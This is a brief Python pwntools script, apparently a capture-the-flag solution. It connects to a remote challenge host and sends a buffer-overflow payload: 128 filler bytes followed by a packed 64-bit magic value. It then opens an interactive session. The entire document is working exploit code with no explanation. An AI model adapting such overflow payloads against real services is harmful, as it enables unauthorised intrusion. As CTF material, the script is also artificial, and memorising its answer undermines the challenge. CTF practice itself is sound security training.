from pwn import *

p = remote("bufflow.tasks.2gis.fun", 1495)

payload = b'a' * 128
payload += p64(0xdeadbabebeefc0de)

print(payload)
p.readuntil('> ')
p.write(payload)
p.interactive()
